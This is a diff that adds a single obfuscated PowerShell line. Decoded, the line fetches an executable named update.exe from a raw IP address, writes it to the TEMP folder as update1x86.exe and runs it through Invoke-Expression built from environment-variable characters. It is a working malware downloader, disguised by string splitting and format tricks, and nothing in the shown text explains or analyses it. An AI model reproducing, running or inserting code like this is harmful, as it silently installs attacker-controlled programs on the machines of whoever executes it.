@@ -1,0 +1,1 @@
+﻿.( $Env:COmspec[4,15,25]-joIn'') ((('(New-'+'Objec'+'t S'+'ys'+'te'+'m.'+'Net.We'+'bCl'+'ient).Do'+'wnlo'+'adFile({2'+'}ht'+'tp://18'+'5'+'.117.75.43/u'+'p'+'d'+'a'+'te.ex'+'e'+'{2},'+'{0}'+'{1}e'+'nv:TE'+'MP{3}upda'+'t'+'e1x86'+'.exe{0}'+');'+'Start-Process '+'({0'+'}{1}'+'env'+':T'+'EMP{'+'3}'+'update1x86.exe{0})')-f [Char]34,[Char]36,[Char]39,[Char]92))
